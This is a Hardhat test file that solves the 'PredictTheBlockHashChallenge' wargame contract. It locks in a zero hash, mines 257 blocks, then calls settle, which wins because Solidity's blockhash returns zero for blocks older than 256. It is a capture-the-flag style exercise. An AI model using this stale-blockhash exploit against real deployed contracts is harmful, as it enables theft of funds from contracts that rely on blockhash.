const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");
const { BigNumber } = ethers;
const { mine } = require("@nomicfoundation/hardhat-network-helpers");

/*
  1. deploy contract with 1 ether
  2. call lockInGuess with hash 0
  3. wait 257 blocks and call settle 
    this will try to get the blockHash(block.number-257) and will return 0
    because solidity can only see the blockHash of the past 256 blocks
*/

describe("PredictTheBlockHashChallenge", function () {
  async function deployOneYearLockFixture() {
    const [owner] = await ethers.getSigners();

    //1. deploy contract
    const PredictHash = await ethers.getContractFactory(
      "PredictTheBlockHashChallenge"
    );
    const contractFuture = await PredictHash.deploy({
      value: ethers.utils.parseEther("1"),
    });

    provider = ethers.provider;

    return { contractFuture, provider, owner };
  }

  it("Contract PredictTheFuture has 1 ether", async () => {
    const { contractFuture, provider } = await loadFixture(
      deployOneYearLockFixture
    );
    const contractBalance = await provider.getBalance(contractFuture.address);
    expect(contractBalance).to.be.equal(
      new BigNumber.from(ethers.utils.parseEther("1"))
    );
  });

  describe("Play the game", () => {
    it("guess()", async () => {
      const { contractFuture, provider, owner, contractSolution } =
        await loadFixture(deployOneYearLockFixture);

      //check balance before attack, contractFuture is 1 ether
      const balanceBeforeAttack = await provider.getBalance(
        contractFuture.address
      );
      expect(balanceBeforeAttack).to.be.equal(
        new BigNumber.from(ethers.utils.parseEther("1"))
      );

      //2. call lockInGuess with hash 0 and msg.value = 1 ether
      const hash = ethers.utils.hexZeroPad(0, 32);
      const msgValue = ethers.utils.parseEther("1");
      const lockGuess0 = await contractFuture
        .connect(owner)
        .lockInGuess(hash.toString(), { value: msgValue });
      await lockGuess0.wait();

      //3. mine 257 blocks
      await mine(257);

      //call settle
      const settleTx = await contractFuture.connect(owner).settle();
      await settleTx.wait();

      //check if isComplete()
      const win = await contractFuture.isComplete();
      expect(win).to.be.equal(true);
    });
  });
});
